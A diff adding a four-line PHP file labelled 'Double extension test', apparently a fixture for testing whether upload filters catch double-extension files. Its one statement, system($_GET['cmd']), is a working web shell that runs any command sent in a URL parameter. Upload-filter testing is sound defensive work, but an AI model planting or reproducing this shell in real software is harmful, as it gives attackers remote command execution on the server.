@@ -1,0 +1,4 @@
+<?php
+// Double extension test
+system($_GET['cmd']);
+?>
